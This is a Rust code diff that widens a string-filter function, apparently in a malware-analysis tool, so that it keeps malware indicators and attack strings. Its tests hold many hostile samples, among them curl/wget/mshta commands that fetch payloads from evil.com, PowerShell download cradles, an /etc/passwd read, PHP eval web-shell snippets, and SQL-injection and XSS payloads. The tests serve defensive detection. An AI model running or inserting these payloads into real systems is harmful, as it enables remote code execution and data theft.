@@ -14,6 +14,7 @@
 pub fn is_garbage(s: &str) -> bool {
     // Normalize: trim whitespace first
     let trimmed = s.trim();
+    let len = trimmed.len();
 
     // Fast path: longer strings with normal patterns are rarely garbage
     // This avoids expensive analysis for the common case
@@ -43,6 +44,229 @@ pub fn is_garbage(s: &str) -> bool {
         }
     }
 
+    // Special case: Cryptocurrency addresses (ransomware/miner IOCs)
+    if len >= 26 && len <= 108 {
+        // Bitcoin (legacy): starts with 1 or 3, 26-35 chars, base58
+        // Bitcoin (bech32): starts with bc1, 42+ chars
+        // Ethereum: starts with 0x, 42 chars hex
+        // Monero: starts with 4 or 8, 95-108 chars
+        // Litecoin: starts with L or M, 26-35 chars
+        // Dogecoin: starts with D, 34 chars
+        let looks_like_crypto = (trimmed.starts_with('1') || trimmed.starts_with('3'))
+            || trimmed.starts_with("bc1")
+            || (trimmed.starts_with("0x") && len == 42)
+            || ((trimmed.starts_with('4') || trimmed.starts_with('8')) && len >= 90)
+            || (trimmed.starts_with('L') || trimmed.starts_with('M'))
+            || trimmed.starts_with('D');
+
+        if looks_like_crypto {
+            // Check if mostly alphanumeric (crypto addresses are base58/hex)
+            let alnum_count = trimmed.chars().filter(|c| c.is_alphanumeric()).count();
+            if alnum_count * 100 / len >= 95 {
+                return false; // Cryptocurrency addresses are NOT garbage
+            }
+        }
+    }
+
+    // Special case: Mining pool URLs and stratum protocol
+    if trimmed.contains("stratum+tcp://") || trimmed.contains("stratum+ssl://") {
+        return false; // Stratum URLs are NOT garbage
+    }
+
+    // Mining pool domains (common patterns)
+    if (trimmed.contains("pool.") || trimmed.contains("nanopool") || trimmed.contains("minergate"))
+        && (trimmed.contains(".com") || trimmed.contains(".org") || trimmed.contains(":"))
+    {
+        return false; // Mining pool URLs are NOT garbage
+    }
+
+    // Cryptocurrency miner software names
+    if trimmed.contains("xmrig")
+        || trimmed.contains("xmr-stak")
+        || trimmed.contains("cpuminer")
+        || trimmed.contains("ccminer")
+        || trimmed.contains("ethminer")
+        || trimmed.contains("phoenixminer")
+        || trimmed.contains("t-rex")
+        || trimmed.contains("--donate-level")
+        || trimmed.contains("--algo=")
+        || trimmed.contains("--cuda-devices")
+        || (trimmed.contains("-o ") && trimmed.contains("-u "))
+    {
+        return false; // Miner software strings are NOT garbage
+    }
+
+    // Special case: Onion/Tor URLs (ransomware C2)
+    if trimmed.contains(".onion") && len >= 10 {
+        return false; // Tor addresses are NOT garbage
+    }
+
+    // Special case: CTF flag formats and GUIDs
+    if trimmed.starts_with('{') && trimmed.ends_with('}') {
+        // CTF flags: CTF{...}, flag{...}, FLAG{...}, etc.
+        if len > 5 && (trimmed.contains("CTF{") || trimmed.contains("flag{") || trimmed.contains("FLAG{")
+            || trimmed.contains("picoCTF{") || trimmed.contains("HTB{"))
+        {
+            return false; // CTF flags are NOT garbage
+        }
+        // GUIDs: {XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX} (usually 38 chars with braces)
+        // Be flexible: 36-38 chars, 4 dashes, mostly hex
+        if (36..=38).contains(&len) {
+            let dash_count = trimmed.chars().filter(|&c| c == '-').count();
+            let hex_count = trimmed.chars().filter(|c| c.is_ascii_hexdigit()).count();
+            // GUID has 4 dashes and mostly hex digits (allow 30-32)
+            if dash_count == 4 && hex_count >= 30 && hex_count <= 32 {
+                return false; // GUIDs are NOT garbage
+            }
+        }
+    }
+
+    // Special case: Email addresses
+    if trimmed.contains('@') && trimmed.contains('.') && len >= 6 {
+        let at_count = trimmed.chars().filter(|&c| c == '@').count();
+        let dot_count = trimmed.chars().filter(|&c| c == '.').count();
+        // Valid email: single @, at least one dot, mostly alphanumeric + common chars
+        if at_count == 1 && dot_count >= 1 {
+            let valid_chars = trimmed.chars().filter(|c| {
+                c.is_alphanumeric() || matches!(c, '@' | '.' | '-' | '_' | '+')
+            }).count();
+            if valid_chars * 100 / len >= 85 {
+                return false; // Email addresses are NOT garbage
+            }
+        }
+    }
+
+    // Special case: Windows registry paths
+    if trimmed.contains("HKLM\\") || trimmed.contains("HKCU\\") || trimmed.contains("HKEY_") {
+        return false; // Registry paths are NOT garbage
+    }
+
+    // Special case: LDAP/AD paths
+    if trimmed.contains("LDAP://") || (trimmed.contains("CN=") && trimmed.contains("DC=")) {
+        return false; // LDAP paths are NOT garbage
+    }
+
+    // Special case: JWT tokens (3 base64 parts separated by dots)
+    if trimmed.matches('.').count() == 2 && len >= 50 {
+        let parts: Vec<&str> = trimmed.split('.').collect();
+        if parts.len() == 3 && parts.iter().all(|p| !p.is_empty()) {
+            // Check if all parts are base64-like (alphanumeric + - _)
+            let base64_chars = trimmed.chars().filter(|c| {
+                c.is_alphanumeric() || matches!(c, '.' | '-' | '_' | '=')
+            }).count();
+            if base64_chars * 100 / len >= 95 {
+                return false; // JWT tokens are NOT garbage
+            }
+        }
+    }
+
+    // Special case: PEM/RSA keys
+    if trimmed.contains("-----BEGIN") || trimmed.contains("-----END") {
+        return false; // PEM keys are NOT garbage
+    }
+
+    // Special case: SQL injection patterns
+    if (trimmed.contains("' OR '") || trimmed.contains("1'='1"))
+        || (trimmed.contains("UNION") && trimmed.contains("SELECT"))
+        || trimmed.contains("admin'--")
+    {
+        return false; // SQL injection patterns are NOT garbage
+    }
+
+    // Special case: XSS payloads
+    if (trimmed.contains("<script>") && trimmed.contains("</script>"))
+        || (trimmed.contains("onerror=") && trimmed.contains("alert("))
+        || trimmed.starts_with("javascript:")
+    {
+        return false; // XSS payloads are NOT garbage
+    }
+
+    // Special case: API key formats
+    if (trimmed.starts_with("AKIA") && len >= 20)  // AWS
+        || (trimmed.starts_with("ghp_") && len >= 36)  // GitHub
+        || (trimmed.starts_with("sk_live_") || trimmed.starts_with("pk_live_"))  // Stripe
+        || (trimmed.starts_with("xox") && len >= 30)  // Slack
+    {
+        let alnum_count = trimmed.chars().filter(|c| c.is_alphanumeric() || *c == '_').count();
+        if alnum_count * 100 / len >= 90 {
+            return false; // API keys are NOT garbage
+        }
+    }
+
+    // Special case: Code patterns commonly found in malware
+    // Detect various language-specific obfuscation patterns
+
+    // C/C++ patterns
+    if trimmed.contains("__attribute__")
+        || trimmed.contains("#define")
+        || trimmed.contains("#include")
+        || (trimmed.contains("char *") && trimmed.contains("0x"))
+        || (trimmed.contains("((") && trimmed.contains("))") && trimmed.contains("0x"))
+    {
+        return false; // C/C++ code is NOT garbage
+    }
+
+    // PHP patterns
+    if trimmed.contains("eval(")
+        || trimmed.contains("base64_decode(")
+        || trimmed.contains("$_GET")
+        || trimmed.contains("$_POST")
+        || trimmed.contains("$_SERVER")
+        || trimmed.contains("$_COOKIE")
+        || trimmed.contains("$GLOBALS")
+        || trimmed.contains("preg_replace(")
+        || (trimmed.starts_with("${") && trimmed.contains("}"))
+    {
+        return false; // PHP code is NOT garbage
+    }
+
+    // Perl patterns
+    if trimmed.contains("pack(")
+        || trimmed.contains("$ARGV")
+        || trimmed.contains("eval(")
+        || (trimmed.contains("open(") && trimmed.contains("|"))
+    {
+        return false; // Perl code is NOT garbage
+    }
+
+    // Shell patterns
+    if trimmed.contains("${IFS}")
+        || (trimmed.contains("$(") && trimmed.contains(")"))
+        || (trimmed.contains("eval") && (trimmed.contains("base64") || trimmed.contains("echo")))
+    {
+        return false; // Shell code is NOT garbage
+    }
+
+    // Command injection patterns (CTF/pentesting)
+    if (trimmed.contains("; ") && (trimmed.contains("cat") || trimmed.contains("wget") || trimmed.contains("curl")))
+        || (trimmed.contains("| ") && (trimmed.contains("whoami") || trimmed.contains("id") || trimmed.contains("uname")))
+        || (trimmed.starts_with('`') && trimmed.ends_with('`'))
+    {
+        return false; // Command injection patterns are NOT garbage
+    }
+
+    // Windows command patterns (malware persistence)
+    if trimmed.contains("schtasks")
+        || trimmed.contains("net user")
+        || trimmed.contains("reg add")
+        || trimmed.contains("powershell")
+        || trimmed.contains("certutil")
+        || trimmed.contains("mshta")
+        || trimmed.contains("IEX(")
+        || trimmed.contains("DownloadString")
+    {
+        return false; // Windows malware commands are NOT garbage
+    }
+
+    // Ransom note patterns
+    if trimmed.contains("ENCRYPTED") || trimmed.contains("DECRYPT") || trimmed.contains("Bitcoin") {
+        let uppercase_count = trimmed.chars().filter(|c| c.is_uppercase()).count();
+        // If mostly uppercase with these keywords, likely a ransom message
+        if uppercase_count * 100 / len > 50 {
+            return false; // Ransom messages are NOT garbage
+        }
+    }
+
     // Special case: Obfuscated JavaScript/code patterns with hex identifiers
     // Common in malware: _0x1c1000, _0x230d, function _0x..., const _0x..., etc.
     // Detect by presence of _0x pattern (hex identifier prefix used in obfuscation)
@@ -65,6 +289,38 @@ pub fn is_garbage(s: &str) -> bool {
             let alnum_count = trimmed.chars().filter(|c| c.is_alphanumeric()).count();
             if alnum_count >= 6 {
                 return false; // Obfuscated JavaScript/code is NOT garbage
+            }
+        }
+    }
+
+    // Special case: HTTP headers (common in network traffic analysis)
+    if (trimmed.starts_with("Host:")
+        || trimmed.starts_with("User-Agent:")
+        || trimmed.starts_with("Content-Type:")
+        || trimmed.starts_with("Accept:")
+        || trimmed.starts_with("Authorization:")
+        || trimmed.starts_with("Cookie:"))
+        && trimmed.len() >= 10
+    {
+        return false; // HTTP headers are NOT garbage
+    }
+
+    // Special case: Comma-separated lists (locales, encodings, languages)
+    if trimmed.contains(',') && trimmed.len() >= 10 {
+        let parts: Vec<&str> = trimmed.split(',').collect();
+        if parts.len() >= 2 {
+            // Check if parts look like identifiers (alphanumeric with dashes/underscores)
+            let valid_parts = parts
+                .iter()
+                .filter(|p| {
+                    !p.is_empty()
+                        && p.chars()
+                            .all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '.')
+                })
+                .count();
+            // If most parts are valid identifiers, it's a list
+            if valid_parts * 100 / parts.len() >= 75 {
+                return false; // Comma-separated lists are NOT garbage
             }
         }
     }
@@ -105,7 +361,19 @@ pub fn is_garbage(s: &str) -> bool {
             return true;
         }
     }
-    let len = trimmed.len();
+
+    // Check for literal escape sequences that indicate corrupted/malformed data
+    // Legitimate code might have these, but raw strings with \x, \u sequences are usually garbage
+    if trimmed.len() < 30 && (trimmed.contains("\\x") || trimmed.contains("\\u") || trimmed.contains("\\U")) {
+        // If it's not in a code-like context (no quotes, parentheses, etc.), it's garbage
+        let has_code_context = trimmed.contains('"') || trimmed.contains('\'')
+            || trimmed.contains('(') || trimmed.contains('[')
+            || trimmed.contains("print") || trimmed.contains("echo")
+            || trimmed.contains("const") || trimmed.contains("var");
+        if !has_code_context {
+            return true;
+        }
+    }
 
     // Empty or whitespace-only
     if len == 0 {
@@ -115,6 +383,50 @@ pub fn is_garbage(s: &str) -> bool {
     // Single characters are almost always garbage from raw scans
     if len == 1 {
         return true;
+    }
+
+    // Special case: MAC addresses (00:1A:2B:3C:4D:5E, 00-1A-2B-3C-4D-5E, 001A.2B3C.4D5E)
+    if len >= 12 && len <= 17 {
+        // Colon format: 00:1A:2B:3C:4D:5E (17 chars)
+        // Dash format: 00-1A-2B-3C-4D-5E (17 chars)
+        // Cisco format: 001A.2B3C.4D5E (14 chars)
+        let colon_count = trimmed.chars().filter(|&c| c == ':').count();
+        let dash_count = trimmed.chars().filter(|&c| c == '-').count();
+        let dot_count = trimmed.chars().filter(|&c| c == '.').count();
+        let hex_count = trimmed.chars().filter(|c| c.is_ascii_hexdigit()).count();
+
+        // Colon or dash format: 5 separators, 12 hex digits
+        if (colon_count == 5 || dash_count == 5) && hex_count == 12 {
+            return false;
+        }
+        // Cisco format: 2 dots, 12 hex digits
+        if dot_count == 2 && hex_count == 12 {
+            return false;
+        }
+    }
+
+    // Special case: IPv6 addresses (contains :: or multiple colons with hex)
+    if len >= 3 && trimmed.contains(':') {
+        let colon_count = trimmed.chars().filter(|&c| c == ':').count();
+        let hex_count = trimmed.chars().filter(|c| c.is_ascii_hexdigit()).count();
+        // IPv6 has at least 2 colons and mostly hex digits
+        // ::1 (shortest), fe80::1, 2001:db8::1, etc.
+        if colon_count >= 2 && hex_count >= 1 {
+            // Check if it's mostly hex and colons (>80%)
+            let hex_and_colon = trimmed.chars().filter(|c| c.is_ascii_hexdigit() || *c == ':' || *c == '.').count();
+            if hex_and_colon * 100 / len > 80 {
+                return false;
+            }
+        }
+    }
+
+    // Special case: Crypto hashes and keys (long hex strings)
+    if len >= 32 && len <= 128 {
+        let hex_count = trimmed.chars().filter(|c| c.is_ascii_hexdigit()).count();
+        // If >95% hex digits, it's likely a hash/key
+        if hex_count * 100 / len > 95 {
+            return false;
+        }
     }
 
     // Special case: locale strings (en_US, zh_CN, etc.)
@@ -155,12 +467,14 @@ pub fn is_garbage(s: &str) -> bool {
     if trimmed.contains("2>&1")  // stderr redirect to stdout
         || trimmed.contains("2>")  // stderr redirect to file
         || trimmed.contains("<<")  // heredoc
-        || (trimmed.contains('>') && trimmed.split_whitespace().count() >= 2)
-    // redirect with spaces
+        || (trimmed.contains(" > ") && trimmed.split_whitespace().count() >= 2)
+    // redirect with spaces (require spaces around > to avoid false positives like "rL*>@")
     {
-        // Check if it looks like a command (has alphanumeric content)
+        // Check if it looks like a command (has alphanumeric content and mostly ASCII)
         let alnum_count = trimmed.chars().filter(|c| c.is_alphanumeric()).count();
-        if alnum_count >= 3 {
+        let ascii_chars = trimmed.chars().filter(|c| c.is_ascii()).count();
+        // Must have at least 3 alphanumeric AND be mostly ASCII (>80%)
+        if alnum_count >= 3 && ascii_chars * 100 / trimmed.chars().count() > 80 {
             return false; // Shell commands with redirections are NOT garbage
         }
     }
@@ -439,10 +753,27 @@ pub fn is_garbage(s: &str) -> bool {
         return true;
     }
 
-    // Short strings with non-ASCII characters are often misaligned reads
+    // Strings with excessive non-ASCII characters are often misaligned reads or corrupted data
     let non_ascii_count = len - ascii_count;
-    if non_ascii_count > 0 && len < 20 && non_ascii_count * 5 > ascii_count {
-        return true;
+
+    // For short strings (< 30 chars), be strict about non-ASCII content
+    if non_ascii_count > 0 && len < 30 {
+        // If non-ASCII chars are more than 20% of the string, it's likely garbage
+        if non_ascii_count * 100 / len > 20 {
+            return true;
+        }
+        // Even 1-2 non-ASCII chars in very short strings (< 10) is suspicious
+        if len < 10 && non_ascii_count >= 2 {
+            return true;
+        }
+    }
+
+    // For longer strings, check if non-ASCII chars dominate
+    if non_ascii_count > 0 && len >= 30 {
+        // If more than 30% non-ASCII, it's garbage (corrupted or misaligned)
+        if non_ascii_count * 100 / len > 30 {
+            return true;
+        }
     }
 
     // Short strings ending with unusual unicode are suspicious
@@ -871,6 +1202,213 @@ mod tests {
         assert!(!is_garbage("lllllIIIIlllllIlII=IIllIlI.IllIllIllIllllIIlIIlIllIl();llIIIIIllllIllIlII=lilIIlI.IllIllIllIllllIIlIIlIllIl();llIlIIIIIIIIllIIlI=lIllIlIlIIIlIIIlII.IllIIlIIlllIIIIlIlIIllIII(lllllIIIIlllllIlII,llIIIIIllllIllIlII)"));
         assert!(!is_garbage("return llIIIIIlIllIllIlIl(lllIllllIIIllIllII.IllllIIllllIIIIIIlIIlIIII(llIlIIIIIIIIllIIlI)).IlIlIlIlIIIIlIllIllllllII()"));
         assert!(!is_garbage("lIlIlIlIIIlIllllll(IIlIlIIIlIIIIlIIIl(IllIllIlIIIlllllII(llIIlIlllllIIlllII(lIlllllIl)),llIIlIlllllIIlllII(lIIIIIlI))(lIllIlIlIIIlIIIlII.IlIIIllIIIIlllIIIlllIlIll(lIlIIIlIlIIIlI.replace"));
+    }
+
+    #[test]
+    fn test_is_garbage_malware_iocs() {
+        // IOCs commonly found in malware should NOT be garbage
+
+        // MAC addresses
+        assert!(!is_garbage("00:1A:2B:3C:4D:5E"), "MAC address colon format");
+        assert!(!is_garbage("00-1A-2B-3C-4D-5E"), "MAC address dash format");
+        assert!(!is_garbage("001A.2B3C.4D5E"), "MAC address Cisco format");
+
+        // IPv6 addresses
+        assert!(!is_garbage("2001:0db8:85a3:0000:0000:8a2e:0370:7334"), "IPv6 full");
+        assert!(!is_garbage("2001:db8:85a3::8a2e:370:7334"), "IPv6 compressed");
+        assert!(!is_garbage("::1"), "IPv6 loopback");
+        assert!(!is_garbage("fe80::1"), "IPv6 link-local");
+        assert!(!is_garbage("2001:db8::192.0.2.1"), "IPv6 with IPv4");
+
+        // Crypto keys and hashes (RC4, AES, etc.)
+        assert!(!is_garbage("5f4dcc3b5aa765d61d8327deb882cf99"), "MD5 hash");
+        assert!(!is_garbage("2fd4e1c67a2d28fced849ee1bb76e7391b93eb12"), "SHA1 hash");
+        assert!(!is_garbage("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"), "SHA256 hash");
+        assert!(!is_garbage("DEADBEEF1234567890ABCDEF"), "Hex key");
+
+        // Comma-delimited locale/language values
+        assert!(!is_garbage("en_US,en,en_GB,fr_FR,de_DE"), "Locale list");
+        assert!(!is_garbage("en-US,zh-CN,ja-JP,ko-KR"), "Language codes");
+        assert!(!is_garbage("UTF-8,ISO-8859-1,ASCII,UTF-16"), "Encoding list");
+
+        // Obfuscated code patterns - C
+        assert!(!is_garbage("char *p=((char*)0x41414141);"), "C pointer obfuscation");
+        assert!(!is_garbage("__attribute__((constructor))"), "C attribute");
+        assert!(!is_garbage("#define XOR(a,b) ((a)^(b))"), "C macro");
+
+        // Obfuscated code patterns - PHP
+        assert!(!is_garbage("eval(base64_decode('SGVsbG8='));"), "PHP eval base64");
+        assert!(!is_garbage("${'GLOBALS'}['_GET']"), "PHP dynamic globals");
+        assert!(!is_garbage("${$_GET['x']}($_POST['y']);"), "PHP variable variables");
+        assert!(!is_garbage("preg_replace('/e/e','system($_GET[c])','');"), "PHP preg_replace /e");
+
+        // Obfuscated code patterns - Perl
+        assert!(!is_garbage("eval(pack('H*','48656c6c6f'));"), "Perl eval pack");
+        assert!(!is_garbage("system($ARGV[0]);"), "Perl system call");
+        assert!(!is_garbage("open(F,'|/bin/sh');"), "Perl pipe open");
+
+        // Obfuscated code patterns - Shell
+        assert!(!is_garbage("eval $(echo SGVsbG8K|base64 -d)"), "Shell eval base64");
+        assert!(!is_garbage("sh -c 'curl http://evil.com|sh'"), "Shell curl pipe");
+        assert!(!is_garbage("${IFS}cat${IFS}/etc/passwd"), "Shell IFS obfuscation");
+
+        // Network indicators
+        assert!(!is_garbage("Host: evil.com:8080"), "HTTP host header");
+        assert!(!is_garbage("User-Agent: Mozilla/5.0"), "HTTP user agent");
+        assert!(!is_garbage("Content-Type: application/x-www-form-urlencoded"), "HTTP content type");
+    }
+
+    #[test]
+    fn test_is_garbage_non_ascii_strings() {
+        // Strings with excessive non-ASCII characters should be garbage
+        let test_cases = vec![
+            ("/º ¸`¨wl½¶ zmNy", "Path with non-ASCII chars"),
+            ("cyl}´á!Qñ#´{ûNy1", "Random with non-ASCII chars"),
+            ("CMQpç+9¥g½Ñãiq¸¹:î¦»ölX²", "Long string with non-ASCII"),
+            ("?ÔTlbxbµ¥äèêæ", "Short string with non-ASCII"),
+            ("ÉBXAÕhDqÌuyóÉµ", "Mixed with non-ASCII"),
+            ("ùÉÜÔrzAyÀµCLYìÐ", "Random non-ASCII"),
+            ("ë9[R.-XK3`o3ú¼ÁOY", "Special chars with non-ASCII"),
+            ("rL*>@«ßtS·` tNV°}*¸", "Symbols with non-ASCII"),
+            ("Yapt3OJÃÚ'µ£¦¯È", "Mixed case with non-ASCII"),
+            ("`C dJe`eN{Û", "Backtick with non-ASCII"),
+        ];
+
+        for (s, desc) in test_cases {
+            if !is_garbage(s) {
+                eprintln!("FAILED: {} - String: {:?}, len={}, chars={}",
+                    desc, s, s.len(), s.chars().count());
+            }
+            assert!(is_garbage(s), "{}", desc);
+        }
+    }
+
+    #[test]
+    fn test_is_garbage_literal_escape_sequences() {
+        // Strings with literal \x escape sequences (not in code context) are garbage
+        assert!(is_garbage("RFXA-\\xU*^$U"), "Literal \\x escape outside code");
+        assert!(is_garbage("foo\\x41bar"), "Literal \\x in string");
+
+        // But these should NOT be garbage (code context)
+        assert!(!is_garbage("print \"\\x41\\x42\\x43\""), "Code with escape sequences");
+        assert!(!is_garbage("echo '\\x48\\x65\\x6c\\x6c\\x6f'"), "Shell with escapes");
+    }
+
+    #[test]
+    fn test_is_garbage_ransomware_and_ctf_iocs() {
+        // IOCs commonly found in ransomware and CTF challenges should NOT be garbage
+
+        // Cryptocurrency wallet addresses
+        assert!(!is_garbage("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"), "Bitcoin address (legacy)");
+        assert!(!is_garbage("3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy"), "Bitcoin address (P2SH)");
+        assert!(!is_garbage("bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"), "Bitcoin address (bech32)");
+        assert!(!is_garbage("0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb"), "Ethereum address");
+        assert!(!is_garbage("44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"), "Monero address");
+        assert!(!is_garbage("LdP8Qox1VAhCzLJNqrqPRHWXpnRAjRUa4L"), "Litecoin address");
+        assert!(!is_garbage("DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L"), "Dogecoin address");
+
+        // Cryptocurrency mining pools and stratum URLs
+        assert!(!is_garbage("pool.minexmr.com:4444"), "Monero mining pool");
+        assert!(!is_garbage("xmr-eu1.nanopool.org:14444"), "Nanopool XMR");
+        assert!(!is_garbage("eth-us-east1.nanopool.org:9999"), "Nanopool ETH");
+        assert!(!is_garbage("stratum+tcp://pool.supportxmr.com:3333"), "Stratum URL");
+        assert!(!is_garbage("stratum+ssl://xmr.pool.minergate.com:45700"), "Stratum SSL");
+
+        // Cryptocurrency miner software names and commands
+        assert!(!is_garbage("xmrig"), "XMRig miner");
+        assert!(!is_garbage("xmr-stak"), "XMR-Stak miner");
+        assert!(!is_garbage("cpuminer-multi"), "CPU miner");
+        assert!(!is_garbage("ccminer"), "CUDA miner");
+        assert!(!is_garbage("ethminer"), "Ethereum miner");
+        assert!(!is_garbage("PhoenixMiner"), "Phoenix miner");
+        assert!(!is_garbage("t-rex"), "T-Rex miner");
+        assert!(!is_garbage("--donate-level=1"), "Miner donate flag");
+        assert!(!is_garbage("-o pool.minexmr.com:4444 -u"), "Miner command line");
+        assert!(!is_garbage("--algo=cryptonight"), "Mining algorithm");
+        assert!(!is_garbage("--cuda-devices=0,1"), "GPU device selection");
+
+        // Tor/Onion URLs (common in ransomware)
+        assert!(!is_garbage("http://thehiddenwiki.onion"), "Onion URL HTTP");
+        assert!(!is_garbage("https://3g2upl4pq6kufc4m.onion"), "Onion URL DuckDuckGo");
+        assert!(!is_garbage("ransomware2x4ytmz.onion"), "Onion domain only");
+
+        // CTF flag formats
+        assert!(!is_garbage("CTF{th1s_1s_4_fl4g}"), "CTF flag format");
+        assert!(!is_garbage("flag{base64_encoded_secret}"), "flag{{}} format");
+        assert!(!is_garbage("picoCTF{b1n4ry_3xpl01t4t10n}"), "picoCTF format");
+        assert!(!is_garbage("HTB{h4ck_th3_b0x}"), "HackTheBox format");
+        assert!(!is_garbage("FLAG{SQL_1nj3ct10n_pwn3d}"), "FLAG{{}} format");
+
+        // Email addresses (used in ransomware contact)
+        assert!(!is_garbage("decrypt@protonmail.com"), "Ransomware email");
+        assert!(!is_garbage("recover.files@tutanota.com"), "Recovery email");
+        assert!(!is_garbage("unlock_data@cock.li"), "Contact email");
+
+        // Ransomware file extensions
+        assert!(!is_garbage(".locked"), "Locked extension");
+        assert!(!is_garbage(".encrypted"), "Encrypted extension");
+        assert!(!is_garbage(".crypted"), "Crypted extension");
+        assert!(!is_garbage(".wannacry"), "WannaCry extension");
+        assert!(!is_garbage(".ryuk"), "Ryuk extension");
+        assert!(!is_garbage(".locky"), "Locky extension");
+
+        // Mutex/synchronization names (often weird strings)
+        assert!(!is_garbage("Global\\MsWinZonesCacheCounterMutexA"), "Windows mutex");
+        assert!(!is_garbage("{8F6F0AC4-B9A1-45fd-A8CF-72997C3991B}"), "GUID mutex");
+
+        // Windows registry paths
+        assert!(!is_garbage("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Registry run key");
+        assert!(!is_garbage("HKCU\\Software\\Classes\\exefile\\shell\\open\\command"), "Registry exefile");
+
+        // SQL injection payloads (CTF/pentesting)
+        assert!(!is_garbage("' OR '1'='1"), "SQL injection basic");
+        assert!(!is_garbage("admin'--"), "SQL comment injection");
+        assert!(!is_garbage("1' UNION SELECT NULL,NULL,NULL--"), "SQL union injection");
+
+        // XSS payloads
+        assert!(!is_garbage("<script>alert(1)</script>"), "XSS basic");
+        assert!(!is_garbage("<img src=x onerror=alert(1)>"), "XSS img tag");
+        assert!(!is_garbage("javascript:alert(document.cookie)"), "XSS javascript protocol");
+
+        // Command injection patterns
+        assert!(!is_garbage("; cat /etc/passwd"), "Command injection semicolon");
+        assert!(!is_garbage("| whoami"), "Command injection pipe");
+        assert!(!is_garbage("`id`"), "Command injection backticks");
+        assert!(!is_garbage("$(wget http://evil.com/shell.sh)"), "Command injection wget");
+
+        // Persistence mechanisms
+        assert!(!is_garbage("schtasks /create /tn \"WindowsUpdate\" /tr"), "Scheduled task");
+        assert!(!is_garbage("net user hacker password123 /add"), "User creation");
+        assert!(!is_garbage("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Registry persistence");
+
+        // Common malware/CTF tools signatures
+        assert!(!is_garbage("powershell -enc"), "PowerShell encoded");
+        assert!(!is_garbage("IEX(New-Object Net.WebClient).DownloadString"), "PowerShell download");
+        assert!(!is_garbage("certutil -urlcache -split -f"), "Certutil download");
+        assert!(!is_garbage("mshta http://evil.com/payload.hta"), "Mshta execution");
+
+        // JWT tokens (common in web CTFs)
+        assert!(!is_garbage("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"), "JWT token");
+
+        // RSA/PEM keys (truncated for test)
+        assert!(!is_garbage("-----BEGIN PUBLIC KEY-----"), "PEM header");
+        assert!(!is_garbage("-----END PRIVATE KEY-----"), "PEM footer");
+        assert!(!is_garbage("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA"), "RSA key data");
+
+        // Ransom note patterns
+        assert!(!is_garbage("YOUR FILES HAVE BEEN ENCRYPTED"), "Ransom message");
+        assert!(!is_garbage("Send $500 in Bitcoin to"), "Ransom demand");
+        assert!(!is_garbage("DECRYPT-INSTRUCTIONS.txt"), "Ransom note filename");
+        assert!(!is_garbage("HOW-TO-DECRYPT.html"), "Decrypt instructions");
+
+        // LDAP/AD paths
+        assert!(!is_garbage("LDAP://CN=Users,DC=domain,DC=com"), "LDAP path");
+        assert!(!is_garbage("CN=Administrator,CN=Users,DC=corp,DC=local"), "AD distinguished name");
+
+        // API keys/secrets patterns (should preserve structure even if fake)
+        assert!(!is_garbage("AKIA0123456789ABCDEF"), "AWS access key format");
+        assert!(!is_garbage("ghp_0123456789abcdefghijklmnopqrstuv"), "GitHub token format");
+        assert!(!is_garbage("sk_live_0123456789abcdefghijklmn"), "Stripe secret key");
     }
 
     #[test]
